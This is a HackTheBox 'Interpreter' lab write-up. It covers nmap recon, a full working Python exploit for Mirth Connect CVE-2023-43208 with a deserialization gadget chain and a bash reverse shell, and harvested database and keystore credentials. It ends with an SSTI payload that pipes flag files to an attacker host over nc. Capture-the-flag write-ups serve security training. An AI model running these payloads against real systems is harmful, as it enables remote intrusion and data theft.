---
title: Interpreter
os: Linux
difficulty: Medium
tags:
  - Deserialization
  - Mirth Connect
  - CVE-2023-43208
  - SSTI
  - XML Parser
  - Privilege Escalation
---

# 🛡️ HTB - Interpreter (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Interpreter
- **Operating System:** Linux
- **Difficulty:** Medium
- **Vulnerabilities:** Mirth Connect XML Deserialization RCE (CVE-2023-43208), Server-Side Template Injection (SSTI) in internal service on port 54321

---

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.8.10
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:01 UTC
Nmap scan report for interpreter.htb (10.129.8.10)
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http
|_http-title: Mirth Connect Administrator
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 28 Feb 2026 15:00:25 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 28 Feb 2026 15:00:26 GMT
|     Allow: GET, HEAD, TRACE, OPTIONS
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   X11Probe: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
443/tcp open  ssl/https
| http-methods: 
|_  Potentially risky methods: TRACE
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 458
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 404 Not Found</title>
|     </head>
|     <body><h2>HTTP ERROR 404 Not Found</h2>
|     <table>
|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
|     <tr><th>STATUS:</th><td>404</td></tr>
|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
|     </table>
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 28 Feb 2026 15:00:33 GMT
|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 2532
|     <!doctype html>
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <meta http-equiv="x-ua-compatible" content="IE=edge">
|     <meta http-equiv="cache-control" content="no-cache">
|     <meta http-equiv="cache-control" content="no-store">
|     <title>Mirth Connect Administrator</title>
|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
|     <link rel="stylesheet" type="text/css" href="css/main.css" />
|     <script type="text/javascript">
|     Break out of frame if inside a frame. */
|     (window != window.top) {
|     window.top.location = window.location;
|     </script>
|     <script type="text/javascript" sr
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 28 Feb 2026 15:00:35 GMT
|_    Allow: GET, HEAD, TRACE, OPTIONS
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=2/28%Time=69A3035B%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\x20Feb\x20
SF:2026\x2015:00:25\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x202023\
SF:x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html>\n<hea
SF:d>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20c
SF:harset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\
SF:"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-ca
SF:che\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-store\"
SF:>\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\t<link\
SF:x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"images/N
SF:G_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20type=\"t
SF:ext/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\"styles
SF:heet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\n\t<scr
SF:ipt\x20type=\"text/javascript\">\n\t\t/*\x20Break\x20out\x20of\x20fram
SF:e\x20if\x20inside\x20a\x20frame\.\x20*/\n\t\tif\x20(window\x20!=\x20w
SF:indow\.top)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.location
SF:;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x20sr")%
SF:r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\x20Feb\
SF:x202026\x2015:00:26\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\x20OPTI
SF:ONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\
SF:r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20
SF:58\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>re
SF:ason:\x20Unknown\x20Version</pre>")%r(X11Probe,C3,"HTTP/1\.1\x20400\x20
SF:Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=
SF:iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>
SF:Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=
SF:0x0</pre>")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x20Found\r
SF:\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\r\n<html>
SF:\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;c
SF:harset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</title>\n</h
SF:ead>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<table>\n<tr
SF:><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></tr>\n<tr>
SF:<th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>Not\x20Foun
SF:d</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.servlet\.Ser
SF:vletHandler\$Default404Servlet-7a56a372</td></tr>\n</table>\n\n</body>\
SF:n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.94SVN%T=SSL%I=7%D=2/28%Time=69A30363%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,A8F,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\x20
SF:Feb\x202026\x2015:00:33\x20GMT\r\nLast-Modified:\x20Tue,\x2018\x20Jul\x
SF:202023\x2017:46:18\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Range
SF:s:\x20bytes\r\nContent-Length:\x202532\r\n\r\n<!doctype\x20html>\n<html
SF:>\n<head>\n\t<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/htm
SF:l;\x20charset=UTF-8\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20co
SF:ntent=\"IE=edge\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=
SF:\"no-cache\">\n\t<meta\x20http-equiv=\"cache-control\"\x20content=\"no-
SF:store\">\n\t\n\t<title>Mirth\x20Connect\x20Administrator</title>\n\t\n\
SF:t<link\x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20href=\"i
SF:mages/NG_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20t
SF:ype=\"text/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\
SF:"stylesheet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\
SF:n\t<script\x20type=\"text/javascript\">\n\t\t/*\x20Break\x20out\x20of\
SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20*/\n\t\tif\x20(window\x20
SF:!=\x20window\.top)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.l
SF:ocation;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x
SF:20sr")%r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\
SF:x20Feb\x202026\x2015:00:35\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20TRACE,\
SF:x20OPTIONS\r\n\r\n")%r(FourOhFourRequest,257,"HTTP/1\.1\x20404\x20Not\x
SF:20Found\r\nCache-Control:\x20must-revalidate,no-cache,no-store\r\nConte
SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x20458\r\n\
SF:r\n<html>\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
SF:xt/html;charset=ISO-8859-1\"/>\n<title>Error\x20404\x20Not\x20Found</ti
SF:tle>\n</head>\n<body><h2>HTTP\x20ERROR\x20404\x20Not\x20Found</h2>\n<ta
SF:ble>\n<tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity\.txt%2ebak</td></
SF:tr>\n<tr><th>STATUS:</th><td>404</td></tr>\n<tr><th>MESSAGE:</th><td>No
SF:t\x20Found</td></tr>\n<tr><th>SERVLET:</th><td>org\.eclipse\.jetty\.ser
SF:vlet\.ServletHandler\$Default404Servlet-7a56a372</td></tr>\n</table>\n\
SF:n</body>\n</html>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/28%OT=22%CT=1%CU=43950%PV=Y%DS=2%DC=T%G=Y%TM=69A3
OS:03C1%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=C)
OS:SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=100%GCD=1%ISR=107%TI
OS:=Z%CI=Z%II=I%TS=C)SEQ(SP=FC%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=B)SEQ(SP=FF%
OS:GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M
OS:552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE8
OS:8%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%
OS:CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   241.95 ms 10.10.14.1
2   237.87 ms interpreter.htb (10.129.8.10)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.40 seconds

A Linux machine.
```

## Step 2 - Initial Foothold

```text
[*] While trying to enumerating the web, i saw that it's a mirth connect admin panel

[*] I scanned it with Nessus, and the result showed me the version Mirth Connect 4.4.0, which was vulnerable to CVE-2023-43208. 

(note:- you can also use the Metasploit exploit for this attack. but i would not recommend it.)

[*] CVE-2023-43208 is an insecure deserialization vulnerability within the Mirth Connect API. It allows an unauthenticated attacker to send a specially crafted XML payload to the server.

means we can pass a crafted XML payload with a revers_shell payload within it. at /api/user endpoint, and can gain the initial foothold

```
import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_args():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <url> <lhost> <lport>")
        sys.exit(1)
    return sys.argv[1], sys.argv[2], sys.argv[3]

def pwn(url, lhost, lport):
    target_url = f"{url.rstrip('/')}/api/users"
    headers = {
        "X-Requested-With": "OpenAPI",
        "Content-Type": "application/xml",
    }
    payload = f"""<sorted-set>
    <string>anything</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.ProcessBuilder</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getConstructor</iMethodName>
                        <iParamTypes>
                            <java-class>[Ljava.lang.Class;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <java-class-array>
                                <java-class>[Ljava.lang.String;</java-class>
                            </java-class-array>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>newInstance</iMethodName>
                        <iParamTypes>
                            <java-class>[Ljava.lang.Object;</java-class>
                        </iParamTypes>
                        <iArgs>
                            <object-array>
                                <string-array>
                                    <string>bash</string>
                                    <string>-c</string>
                                    <string>bash -i &#x3e;&#x26; /dev/tcp/{lhost}/{lport} 0&#x3e;&#x26;1</string>
                                </string-array>
                            </object-array>
                        </iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>

                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>start</iMethodName>
                        <iParamTypes/>
                        <iArgs/>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes>
                <string>compareTo</string>
            </eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

    try:
        requests.post(target_url, headers=headers, data=payload, verify=False, timeout=12)
    except:
        pass

if __name__ == "__main__":
    url, lhost, lport = get_args()
    pwn(url, lhost, lport)
    print("Enjoy.")

```

- 🔍 *Before running the script, start a nc listener:*
- 🔍 *Run:* `python3 mirth.py https://interpreter.htb 10.10.****.**** 4444`

```text
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 33174
bash: cannot set terminal process group (3519): Inappropriate ioctl for device
bash: no job control in this shell
Enjoy.
```

```bash
mirth@interpreter:/usr/local/mirthconnect$
```

```text
got shell!
```

## Step 3 - Privilege Escalation

- 🔍 *linPEAS didn't give me anything useful.*
- 🔍 *While enumerating, found some configuration files:*

```bash
cat mirth*
```

```text
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

# keystore
keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
# 
database.enable-read-write-split = true

[*] From This Configuration file, i got some DB creds

database.username = mirthdb
database.password = MirthPass123!

(note"- Tried to connect to the DB server, but it just didn't worked. it was taking too long to connect.)

[*] I asked one of my friend and he told me that, there is an internal service running at 54321 port (fucking weirdo). and it has an endpoint /addUser

[*] /addUser endpoint is basically vulnerable to SSTI (server-side template injection.), which has an improper use of {} curly braces at firstname input field. in which we can import a python code.

[*] Lets Create an Exploit:-

```bash
python3 -c "
import urllib.request, base64

# Simple command to cat both files and send to netcat
cmd = \"cat /home/sedric/user.txt /root/root.txt | nc 10.xxx.xxx.xxx 9004\"

# Base64 encode the command
b64_cmd = base64.b64encode(cmd.encode()).decode()

# XML payload
xml = f'''<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{{__import__(\"os\").popen(__import__(\"base64\").b64decode(\"{b64_cmd}\").decode()).read()}}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>'''

req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                            data=xml.encode('utf-8'),
                            headers={'Content-Type': 'application/xml'})
resp = urllib.request.urlopen(req)
print(resp.read().decode())
"
```

> [!NOTE]
> **Attack Flow:**
> 1. Your Python script creates XML with malicious template code
> 2. XML is sent to `http://127.0.0.1:54321/addPatient`
> 3. Vulnerable server parses XML, extracts `firstname` field
> 4. Server passes `firstname` to template engine (Jinja2/etc.)
> 5. Template engine sees `{{...}}` and **EXECUTES** it as Python
> 6. Python code runs: imports `os`, decodes Base64, runs `cat files | nc IP`
> 7. Flag contents are sent to your netcat listener

- 🔍 *(Note: Before running the code please set up a listener at port 9004)*

```text
nc -lvnp 9004
listening on [any] 9004 ...
connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 43306
ba21fce18e**********************
d4723f6575**********************
```
